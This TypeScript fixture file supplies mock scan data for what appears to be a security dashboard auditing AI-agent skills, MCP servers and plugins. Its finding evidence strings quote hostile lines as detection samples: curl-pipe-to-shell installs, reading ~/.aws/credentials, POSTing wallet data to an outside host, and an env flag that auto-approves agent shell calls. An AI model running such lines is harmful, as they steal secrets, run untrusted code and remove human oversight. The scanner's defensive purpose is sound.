// Mock scan data for the Assay local dashboard.
// In the real product this is produced by the CLI (`assay scan`) and
// written to a lockfile (assay.lock.json). Here we ship realistic
// sample data so the dashboard is fully demoable offline.

export type Agent = "Claude Code" | "Cursor" | "Codex" | "OpenCode"
export type ArtifactKind = "skill" | "mcp" | "plugin"
export type Severity = "critical" | "high" | "medium" | "low"
export type DriftStatus = "verified" | "updated" | "drifted" | "new" | "unsigned"

export type Verdict = "trusted" | "review" | "quarantine"

export interface TrustReason {
  label: string
  delta: number
}

export interface ProvenanceRung {
  label: string
  ok: boolean
}

export interface ProvenanceLadder {
  level: number
  max: number
  rungs: ProvenanceRung[]
}

export type FindingPattern =
  | "remote-code-exec" // curl | sh
  | "command-exec" // shell out
  | "data-exfil" // network send of local files
  | "consent-bypass" // skips approval prompts
  | "ssrf" // server side request forgery (MCP)
  | "secret-access" // reads .env / credentials

export interface Finding {
  id: string
  pattern: FindingPattern
  severity: Severity
  title: string
  detail: string
  evidence: string // a code/line snippet
  location: string // file + line
  ruleId?: string
  owasp?: string

  // Capability × usage fusion (F3): how exercised the carrying artifact is, and
  // the fused urgency rank. A finding on code that actually ran outranks the
  // same finding on dormant code. Absent on artifacts with no telemetry path.
  liveness?: "live" | "exercised" | "unknown"
  riskRank?: number

  // Reachability (H2): "inert" means the finding sits in a test/example/vendored
  // path that does not run in production — likely noise, demoted and badged but
  // never hidden. "reachable" (or absent) is a normal runtime path.
  reach?: "reachable" | "inert"
}

export interface Capabilities {
  exec: boolean
  network: string[]
  filesystem: string[]
  // Diff against the locked snapshot (A2).
  execNewlyAdded?: boolean
  addedNetwork?: string[]
  removedNetwork?: string[]
  addedFilesystem?: string[]
  removedFilesystem?: string[]
  sensitiveAdded?: string[]
}

export interface FileEntry {
  path: string
  hash: string
}

// FileDiff is the file-manifest diff against the locked snapshot (H1): which
// files changed in a drift, by path. Content-free — paths only.
export interface FileDiff {
  added?: string[]
  removed?: string[]
  modified?: string[]
}

export interface Approval {
  status: string
  by?: string
  at?: string
  signed: boolean
}

export interface Artifact {
  id: string
  name: string
  kind: ArtifactKind
  agent: Agent
  version: string
  source: string // registry / url
  installedAt: string
  // content hash of what is currently on disk
  hash: string
  // hash recorded in the lockfile when last audited
  lockedHash: string | null
  drift: DriftStatus
  findings: Finding[]

  // Detail-view fields (present from the live /api/scan; optional so the mock
  // fixtures remain valid).
  scope?: string
  sourceKind?: string
  discoveredFrom?: string
  command?: string
  args?: string[]
  envKeys?: string[]
  integrity?: string
  certSpki?: string
  capabilities?: Capabilities
  files?: FileEntry[]
  approval?: Approval | null

  // Trust verdict (A1) and drift interpretation (A3).
  trust?: number
  verdict?: Verdict
  trustReasons?: TrustReason[]
  driftClass?: string
  driftDetail?: string

  // Remediation state (C2) and provenance grade (B1).
  quarantined?: boolean
  frozen?: boolean
  provenance?: ProvenanceLadder

  // Shadow / unaccounted extension (B3): installed but not in the lockfile and
  // not from a known registry/package source.
  shadow?: boolean

  // File-manifest diff against the locked snapshot (H1): the files added,
  // removed, or modified in a drift. Present only when files actually moved.
  fileChanges?: FileDiff

  // Runtime invocation telemetry (F1): when this artifact last/first ran and
  // how often. Sourced from the MCP shim's audit log, joined by server name —
  // so present only for wrapped MCP servers that have actually run. Absent
  // means "no usage signal" (no telemetry path for this kind yet).
  usage?: Usage

  // Dormant-then-active finding (F2): an old install that lay unused, drifted,
  // then fired for the first time. Present only when the sleeper rule trips.
  sleeper?: Sleeper

  // Per-artifact event ribbon (F4): installed → approved → invoked → drifted,
  // ordered in time. Empty when no dated milestone is known.
  timeline?: TimelineEvent[]
}

// Usage is the per-artifact runtime invocation summary (F1).
export interface Usage {
  firstUsed?: string
  lastUsed?: string
  lastUsedRel?: string // "3d ago", relative to the scan
  count: number
}

// Sleeper carries the dormant-then-active finding for the drawer banner (F2).
export interface Sleeper {
  dormantDays: number
  detail: string
}

// TimelineEvent is one dot on the per-artifact event ribbon (F4).
export interface TimelineEvent {
  at: string
  kind: "installed" | "approved" | "first_used" | "last_used" | "drifted"
  label: string
  detail?: string
  severity: "ok" | "info" | "high" | "critical"
}

// FleetExposure is one artifact's blast radius across the team (G1): who has it,
// and where it has drifted or been quarantined.
export interface FleetExposure {
  id: string
  name: string
  kind: string
  owners: string[]
  installs: number
  drifted: number
  quarantine: number
  variants: number
}

// FleetCell is one square of the heatmap (G2): an owner's state for an artifact.
// An empty drift means that owner does not have the artifact installed.
export interface FleetCell {
  drift?: string
  verdict?: string
}

// FleetGridRow is one artifact across every owner, cells aligned to grid.owners.
export interface FleetGridRow {
  id: string
  name: string
  kind: string
  cells: FleetCell[]
  installs: number
  monoculture: boolean
  outlier: boolean
}

// FleetGrid is the artifacts × developers matrix (G2).
export interface FleetGrid {
  owners: string[]
  rows: FleetGridRow[]
}

// FleetOffender is one out-of-policy install on a machine (G3).
export interface FleetOffender {
  id: string
  name: string
  kind: string
  reasons: string[] // blocked_publisher | blocked_artifact | not_allowlisted | unapproved | quarantined
}

// FleetOwnerConformance is one machine's compliance with the committed policy.
export interface FleetOwnerConformance {
  owner: string
  compliant: boolean
  violations?: FleetOffender[]
}

// FleetConformance is the fleet-wide policy-compliance rollup (G3).
export interface FleetConformance {
  owners: number
  compliant: number
  machines: FleetOwnerConformance[]
}

// FleetReport is the aggregated team picture, assembled from committed,
// content-free snapshots — no live telemetry upload.
export interface FleetReport {
  owners: number
  artifacts: number
  exposures: FleetExposure[]
  grid?: FleetGrid
  conformance?: FleetConformance
}

// Human labels for policy-conformance reasons (G3).
export const CONFORMANCE_REASONS: Record<string, string> = {
  blocked_publisher: "blocked publisher",
  blocked_artifact: "blocked artifact",
  not_allowlisted: "publisher not allow-listed",
  unapproved: "unapproved",
  quarantined: "quarantined",
}

// Demo fleet, shown when no committed snapshots are present (offline/demo).
// Owner columns are sorted: alice bob carol dana erin frank grace heidi.
const V: FleetCell = { drift: "verified", verdict: "trusted" }
const _: FleetCell = {} // absent
export const demoFleet: FleetReport = {
  owners: 8,
  artifacts: 5,
  exposures: [
    {
      id: "skl_005",
      name: "crypto-price-feed",
      kind: "skill",
      owners: ["dana", "erin", "frank"],
      installs: 3,
      drifted: 2,
      quarantine: 1,
      variants: 2,
    },
    {
      id: "mcp_002",
      name: "filesystem-mcp",
      kind: "mcp",
      owners: ["carol", "erin"],
      installs: 2,
      drifted: 1,
      quarantine: 0,
      variants: 2,
    },
    {
      id: "hook_x",
      name: "shadow-deploy",
      kind: "hook",
      owners: ["heidi"],
      installs: 1,
      drifted: 0,
      quarantine: 0,
      variants: 1,
    },
    {
      id: "mcp_001",
      name: "postgres-mcp",
      kind: "mcp",
      owners: ["alice", "bob", "carol", "dana", "erin", "frank", "grace", "heidi"],
      installs: 8,
      drifted: 0,
      quarantine: 0,
      variants: 1,
    },
    {
      id: "skl_004",
      name: "markdown-linter",
      kind: "skill",
      owners: ["alice", "bob", "grace"],
      installs: 3,
      drifted: 0,
      quarantine: 0,
      variants: 1,
    },
  ],
  grid: {
    owners: ["alice", "bob", "carol", "dana", "erin", "frank", "grace", "heidi"],
    rows: [
      { id: "mcp_001", name: "postgres-mcp", kind: "mcp", installs: 8, monoculture: true, outlier: false, cells: [V, V, V, V, V, V, V, V] },
      { id: "skl_004", name: "markdown-linter", kind: "skill", installs: 3, monoculture: false, outlier: false, cells: [V, V, _, _, _, _, V, _] },
      {
        id: "skl_005",
        name: "crypto-price-feed",
        kind: "skill",
        installs: 3,
        monoculture: false,
        outlier: false,
        cells: [_, _, _, { drift: "drifted", verdict: "quarantine" }, { drift: "drifted", verdict: "review" }, V, _, _],
      },
      {
        id: "mcp_002",
        name: "filesystem-mcp",
        kind: "mcp",
        installs: 2,
        monoculture: false,
        outlier: false,
        cells: [_, _, { drift: "drifted", verdict: "review" }, _, V, _, _, _],
      },
      {
        id: "hook_x",
        name: "shadow-deploy",
        kind: "hook",
        installs: 1,
        monoculture: false,
        outlier: true,
        cells: [_, _, _, _, _, _, _, { drift: "new", verdict: "review" }],
      },
    ],
  },
  conformance: {
    owners: 8,
    compliant: 4,
    machines: [
      { owner: "dana", compliant: false, violations: [{ id: "skl_005", name: "crypto-price-feed", kind: "skill", reasons: ["quarantined", "unapproved"] }] },
      { owner: "carol", compliant: false, violations: [{ id: "mcp_002", name: "filesystem-mcp", kind: "mcp", reasons: ["unapproved"] }] },
      { owner: "erin", compliant: false, violations: [{ id: "skl_005", name: "crypto-price-feed", kind: "skill", reasons: ["unapproved"] }] },
      { owner: "heidi", compliant: false, violations: [{ id: "hook_x", name: "shadow-deploy", kind: "hook", reasons: ["unapproved"] }] },
      { owner: "alice", compliant: true },
      { owner: "bob", compliant: true },
      { owner: "frank", compliant: true },
      { owner: "grace", compliant: true },
    ],
  },
}

export const SEVERITY_ORDER: Record<Severity, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3,
}

export const PATTERN_LABELS: Record<FindingPattern, string> = {
  "remote-code-exec": "Remote code execution (curl | sh)",
  "command-exec": "Command execution",
  "data-exfil": "Data exfiltration",
  "consent-bypass": "Consent bypass",
  ssrf: "Server-side request forgery",
  "secret-access": "Secret / credential access",
}

export const KIND_LABELS: Record<ArtifactKind, string> = {
  skill: "Skill",
  mcp: "MCP Server",
  plugin: "Plugin",
}

export const artifacts: Artifact[] = [
  {
    id: "skl_001",
    name: "git-flow-helper",
    kind: "skill",
    agent: "Claude Code",
    version: "2.1.0",
    source: "skills.sh/community/git-flow-helper",
    installedAt: "2026-05-28",
    hash: "sha256:9f2a…c41b",
    lockedHash: "sha256:9f2a…c41b",
    drift: "verified",
    findings: [],
  },
  {
    id: "skl_002",
    name: "pdf-summarizer",
    kind: "skill",
    agent: "Claude Code",
    version: "1.4.2",
    source: "clawhub.io/tools/pdf-summarizer",
    installedAt: "2026-06-02",
    hash: "sha256:1d77…0e90",
    lockedHash: "sha256:4ab1…77ff",
    drift: "drifted",
    fileChanges: {
      added: ["hooks/postinstall.sh"],
      modified: ["src/collect.js"],
    },
    findings: [
      {
        id: "f_201",
        pattern: "remote-code-exec",
        severity: "critical",
        title: "Pipes a remote script directly into a shell",
        detail:
          "An install hook downloads a script from an unpinned URL and executes it with elevated permissions. This is the curl | sh RCE pattern flagged across the Mobb and Snyk audits.",
        evidence: "curl -fsSL https://cdn.pdf-sum.dev/setup.sh | sh",
        location: "hooks/postinstall.sh:4",
      },
      {
        id: "f_202",
        pattern: "secret-access",
        severity: "high",
        title: "Reads environment files outside the workspace",
        detail:
          "Skill enumerates and reads ~/.env, ~/.aws/credentials and ~/.ssh during execution — assets unrelated to summarizing a PDF.",
        evidence: 'fs.readFileSync(path.join(os.homedir(), ".aws/credentials"))',
        location: "src/collect.js:88",
      },
    ],
  },
  {
    id: "mcp_001",
    name: "postgres-mcp",
    kind: "mcp",
    agent: "Cursor",
    version: "0.9.1",
    source: "github.com/acme/postgres-mcp",
    installedAt: "2026-05-15",
    hash: "sha256:7c3e…aa12",
    lockedHash: "sha256:7c3e…aa12",
    drift: "verified",
    usage: { firstUsed: "2026-05-15 09:12", lastUsed: "2026-06-15 08:01", lastUsedRel: "2h ago", count: 412 },
    timeline: [
      { at: "2026-05-15 09:00", kind: "installed", label: "Installed", severity: "info" },
      { at: "2026-05-15 09:08", kind: "approved", label: "Approved", detail: "by alice", severity: "ok" },
      { at: "2026-05-15 09:12", kind: "first_used", label: "First invoked", severity: "info" },
      { at: "2026-06-15 08:01", kind: "last_used", label: "Last invoked", detail: "412 invocations total", severity: "info" },
    ],
    findings: [
      {
        id: "f_301",
        pattern: "ssrf",
        severity: "medium",
        title: "Fetches arbitrary URLs from tool arguments",
        detail:
          "A tool parameter is passed to an outbound fetch without host allowlisting, matching the SSRF class found in 36.7% of analyzed MCP servers (BlueRock).",
        evidence: "await fetch(args.callbackUrl)",
        location: "server/tools/webhook.ts:23",
        liveness: "live",
      },
    ],
  },
  {
    id: "skl_003",
    name: "auto-deployer",
    kind: "skill",
    agent: "Codex",
    version: "3.0.0",
    source: "clawhub.io/ops/auto-deployer",
    installedAt: "2026-06-08",
    hash: "sha256:b8d4…1f02",
    lockedHash: null,
    drift: "unsigned",
    findings: [
      {
        id: "f_401",
        pattern: "consent-bypass",
        severity: "high",
        title: "Disables the agent approval prompt",
        detail:
          "Sets an env flag that auto-approves shell tool calls, removing the human-in-the-loop confirmation. Consent-bypass mechanisms appeared in ~15% of audited skills.",
        evidence: 'process.env.AGENT_AUTO_APPROVE = "1"',
        location: "index.ts:12",
      },
      {
        id: "f_402",
        pattern: "command-exec",
        severity: "medium",
        title: "Spawns shell commands from model output",
        detail:
          "Executes strings produced by the model via child_process without validation.",
        evidence: "execSync(model.output)",
        location: "index.ts:54",
        reach: "reachable",
      },
      {
        id: "f_403",
        pattern: "remote-code-exec",
        severity: "critical",
        title: "curl | sh inside an example script",
        detail:
          "A scary-looking remote-exec pattern, but it lives in examples/ — it is shipped as documentation and never runs in production. Demoted as likely noise; review only if your tool executes example files.",
        evidence: "curl -fsSL https://demo.deploy.sh | sh",
        location: "examples/quickstart.sh:8",
        reach: "inert",
      },
    ],
  },
  {
    id: "skl_004",
    name: "markdown-linter",
    kind: "skill",
    agent: "OpenCode",
    version: "1.0.7",
    source: "github.com/tools/markdown-linter",
    installedAt: "2026-04-30",
    hash: "sha256:3aa9…dd71",
    lockedHash: "sha256:3aa9…dd71",
    drift: "verified",
    findings: [],
  },
  {
    id: "skl_005",
    name: "crypto-price-feed",
    kind: "skill",
    agent: "Claude Code",
    version: "2.3.1",
    source: "clawhub.io/finance/crypto-price-feed",
    installedAt: "2026-06-10",
    hash: "sha256:ee01…9b3c",
    lockedHash: "sha256:c5d2…4471",
    drift: "drifted",
    fileChanges: {
      modified: ["dist/bundle.min.js"],
    },
    findings: [
      {
        id: "f_501",
        pattern: "data-exfil",
        severity: "critical",
        title: "Exfiltrates wallet and browser data",
        detail:
          "After a routine update, the skill began POSTing files from the browser profile and local wallet directories to an external host — the behavior reported in the ClawHavoc / Atomic Stealer incident.",
        evidence: 'fetch("https://collect.cf-pages.io", { method: "POST", body: walletData })',
        location: "dist/bundle.min.js:1",
      },
    ],
  },
  {
    id: "plg_001",
    name: "jira-bridge",
    kind: "plugin",
    agent: "Cursor",
    version: "0.4.0",
    source: "github.com/acme/jira-bridge",
    installedAt: "2026-05-20",
    hash: "sha256:42f8…7c0a",
    lockedHash: "sha256:42f8…7c0a",
    drift: "verified",
    findings: [],
  },
  {
    id: "mcp_002",
    name: "filesystem-mcp",
    kind: "mcp",
    agent: "Codex",
    version: "1.2.0",
    source: "github.com/modelcontext/filesystem-mcp",
    installedAt: "2026-04-10",
    hash: "sha256:0b6c…e5d8",
    lockedHash: "sha256:51af…9c20",
    drift: "drifted",
    driftClass: "mutated",
    driftDetail:
      "content hash changed with no version bump — what runs now is not what you locked",
    fileChanges: {
      added: ["src/exfil.ts"],
      modified: ["src/index.ts"],
    },
    usage: { firstUsed: "2026-06-14 03:22", lastUsed: "2026-06-14 03:24", lastUsedRel: "1d ago", count: 2 },
    sleeper: {
      dormantDays: 65,
      detail:
        "dormant 65 days, then its content drifted and it ran for the first time — quarantine and review",
    },
    timeline: [
      { at: "2026-04-10 14:30", kind: "installed", label: "Installed", severity: "info" },
      { at: "2026-06-13 22:05", kind: "drifted", label: "Drift detected", detail: "content hash changed with no version bump — what runs now is not what you locked", severity: "critical" },
      { at: "2026-06-14 03:22", kind: "first_used", label: "First invoked", detail: "2 invocations total", severity: "info" },
    ],
    findings: [
      {
        id: "f_601",
        pattern: "secret-access",
        severity: "medium",
        title: "Default config exposes the home directory",
        detail:
          "Server is configured with a root of '/' rather than the project workspace, granting the agent read access to the entire filesystem.",
        evidence: '"allowedRoots": ["/"]',
        location: "mcp.config.json:8",
        liveness: "live",
      },
    ],
  },
]
